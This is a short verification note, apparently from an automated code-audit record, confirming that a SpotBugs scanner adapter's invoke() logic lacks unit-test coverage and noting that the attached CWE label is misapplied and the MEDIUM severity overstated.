provenance.confirmation_reasoning: Verified directly. `/Volumes/Mini Vault/untitled_folder/projects/panopticon/skill/scripts/tools/spotbugs.py` lines 26-39 contain exactly the described logic: a three-step classes-dir resolution (target/classes -> build/classes -> bare target, lines 27-31), an `os.environ.get("SPOTBUGS_HOME", "/opt/spotbugs")` default (line 32), and a plugin_jar path built as SPOTBUGS_HOME/plugin/findsecbugs-plugin.jar (line 33). The only unit test file, `/Volumes/Mini Vault/untitled_folder/projects/panopticon/tests/tools/test_spotbugs.py`, has four tests (parse x3, is_applicable x1) and none touch invoke(). I grepped every test under tests/ for `.invoke(` and `is_applicable`: the sole caller of SpotBugsAdapter.invoke is `/Volumes/Mini Vault/untitled_folder/projects/panopticon/tests/tools/test_java_integration.py:24`, which self-skips unless a WebGoat fixture directory exists; tests/fixtures/ contains no WebGoat (manifest.json line 14 points at an out-of-repo path /opt/panopticon-fixtures/WebGoat), and that test asserts only that findings are non-empty -- it never exercises or asserts the branch selection or the command vector. tests/test_run_tools.py mentions 'spotbugs' only as a mount-mode string in run_tools dispatch, never calling the adapter. The gap is also anomalous within this repo: sibling adapters do have invoke() command-assertion tests (e.g. tests/tools/test_brakeman.py:52-61 patches scripts.tools.base.subprocess.run and asserts the exact argv), so the claimed remediation matches an established local pattern. Two caveats that do not change the verdict: (a) the attached CWE-1104 (use of unmaintained third-party component) is misapplied to a test-coverage gap and is correctly flagged unverified; (b) severity MEDIUM is generous for a missing unit test on an adapter whose worst failure mode is scanning the wrong directory, not a security defect.
